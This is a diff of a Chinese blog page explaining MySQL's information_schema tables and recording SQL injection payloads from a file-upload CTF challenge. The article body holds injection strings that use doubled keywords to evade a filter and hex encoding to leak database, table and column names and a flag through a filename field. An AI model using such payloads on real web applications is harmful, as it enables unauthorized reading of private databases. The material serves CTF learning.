@@ -16,7 +16,7 @@
 <meta property="og:site_name" content="pte01">
 <meta property="og:description" content="1.概念   information_schema是MySQL自带的数据库，存储了数据库的元数据（关于数据的数据），它里面的表的本质是上是视图。 2.information_schema中的几个表1.schemateSCHEMA_NAME2.tablesTABLE_SCHEMATABLE_NAME3.columnsTABLE_SCHEMATABLE_NAMECOLUMN_NAME 3.利用sql注">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-08-01T04:38:48.399Z">
+<meta property="og:updated_time" content="2019-08-05T08:36:32.833Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="关于mysql中的information_schema">
 <meta name="twitter:description" content="1.概念   information_schema是MySQL自带的数据库，存储了数据库的元数据（关于数据的数据），它里面的表的本质是上是视图。 2.information_schema中的几个表1.schemateSCHEMA_NAME2.tablesTABLE_SCHEMATABLE_NAME3.columnsTABLE_SCHEMATABLE_NAMECOLUMN_NAME 3.利用sql注">
@@ -176,8 +176,11 @@
       
         <h3 id="1-概念"><a href="#1-概念" class="headerlink" title="1.概念"></a>1.概念</h3><p>   information_schema是MySQL自带的数据库，存储了数据库的元数据（关于数据的数据），它里面的表的本质是上是视图。</p>
 <h3 id="2-information-schema中的几个表"><a href="#2-information-schema中的几个表" class="headerlink" title="2.information_schema中的几个表"></a>2.information_schema中的几个表</h3><p>1.schemate<br>SCHEMA_NAME<br>2.tables<br>TABLE_SCHEMA<br>TABLE_NAME<br>3.columns<br>TABLE_SCHEMA<br>TABLE_NAME<br>COLUMN_NAME</p>
-<h3 id="3-利用sql注入获取数据库中的信息"><a href="#3-利用sql注入获取数据库中的信息" class="headerlink" title="3.利用sql注入获取数据库中的信息"></a>3.利用sql注入获取数据库中的信息</h3><p>获取当前数据库名：sql ‘+(selselectect CONV(substr(hex(dAtaBase()),1,12),16,10))+’.jpg<br>获取指定数据库中的表名：sql ‘+(seleselectct+CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = ‘web_upload’ limit 1,1)),1,12),16,10))+’.jpg<br>file_name’+(seleselectct+conv(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema = ‘web_upload’ limit 1,1)),1,12),16,10))+’.jpg</p>
-<p>sql’ +(selselectect+conv(substr(hex((selselectect column_name frfromom information_schema.columns where table_name=’flag_is_here’ limit 0,1)),1,12),16,10))+’.jpg</p>
+<h3 id="3-利用sql注入获取数据库中的信息"><a href="#3-利用sql注入获取数据库中的信息" class="headerlink" title="3.利用sql注入获取数据库中的信息"></a>3.利用sql注入获取数据库中的信息</h3><p>获取当前数据库名：sql ‘+(selselectect CONV(substr(hex(dAtaBase()),1,12),16,10))+’.jpg<br>获取指定数据库中的表名：sql ‘+(seleselectct+CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = ‘web_upload’ limit 1,1)),1,12),16,10))+’.jpg</p>
+<p>sql’+(selselectect+conv(substr(hex((selselectect group_concat(column_name) frfromom information_schema.columns where table_name = ‘hello_flag_is_here’)),1,12),16,10))+’.jpg</p>
+<p>filename’,’1660’,’1660’),((selselectect group_concat(column_name) frfromom information_schema.columns where table_name = ‘hello_flag_is_here’),’1660’,’1660’)#.jpg</p>
+<p>sql’+(seleselectct+conv(substr(hex((seleselectct group_concat(i_am_flag) frfromom hello_flag_is_here)),1,12),16,10))+’.jpg</p>
+<p>!!<a href="mailto:_@m_Th.e_F" target="_blank" rel="noopener">_@m_Th.e_F</a>!lag</p>
 
       
 
@@ -439,7 +442,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">ctf</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">安装配置</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">linux</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -451,11 +462,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">安全</a>
+                <a href="javascript:void(0)" class="js-tag color4">C++</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">linux</a>
+                <a href="javascript:void(0)" class="js-tag color5">网络配置</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -463,7 +474,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">网络配置</a>
+                <a href="javascript:void(0)" class="js-tag color3">安全</a>
               </li>
             
             <div class="clearfix"></div>
